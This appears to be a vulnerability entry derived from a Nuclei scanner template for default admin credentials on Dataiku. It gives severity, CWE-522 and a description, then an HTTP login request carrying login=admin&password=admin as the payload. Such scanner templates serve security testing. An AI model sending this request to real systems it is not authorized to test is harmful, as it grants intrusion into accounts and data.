# Nuclei Template: Dataiku - Default Login
**Template ID:** dataiku-default-login
**Vulnerability Class:** Insufficiently Protected Credentials
**Severity:** High
**CWE:** CWE-522
**Source:** Nuclei Template (`dataiku-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Dataiku contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations. This vulnerability may also lead to server-side request forgery and/or remote code execution.

## Steps to reproduce / Exploit Payload
```http
POST /dip/api/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=utf-8

login=admin&password=admin
```

## References
- https://www.dataiku.com
